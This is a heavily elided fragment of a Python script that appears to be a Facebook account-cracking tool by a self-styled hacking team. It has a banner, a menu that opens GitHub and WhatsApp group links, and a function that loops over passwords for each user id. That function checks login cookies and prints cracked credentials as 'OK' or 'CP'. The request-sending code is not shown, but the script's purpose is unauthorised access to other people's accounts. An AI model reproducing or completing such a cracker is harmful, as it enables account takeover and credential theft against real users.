...
os.system('xdg-open github.com/mohsin09114 ')
...
\033[1;94m       [+]        CREATED BY   :  MOHSIN-X               \033[1;94m[+]

\033[1;94m       [+]        ON GITHUB    :  MOHSIN             \033[1;94m[+]

\033[1;94m       [+]        TEAM         :  ULTR-X        \033[1;94m[+]
...
class Main:
    ...
    def __init__(self):
        ...
        print(" [02] MY WHATSPP GROUP\033[1;35m")

        print(" [00] Exit")        

        Alif =input(" [?] Choose : ")

        os.system('xdg-openhttps://chat.whatsapp.com/LEWozaZppIZBfmpJ3HuBQ0')
        ...
        if Alif in ["2","02"]:
            ...
            os.system('xdg-open https://chat.whatsapp.com/LEWozaZppIZBfmpJ3HuBQ0')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mMOHSIN-X\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[38;5;46m[MOHSIN-X-OK💉] {uid} | {ps}")
                ...
                print(f"\x1b[38;5;196m[MOHSIN-X-CP🥴] {uid}|{ps}")
        ...
        sys.stdout.write(f'\r\033[m[MOHSIN-X👑] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
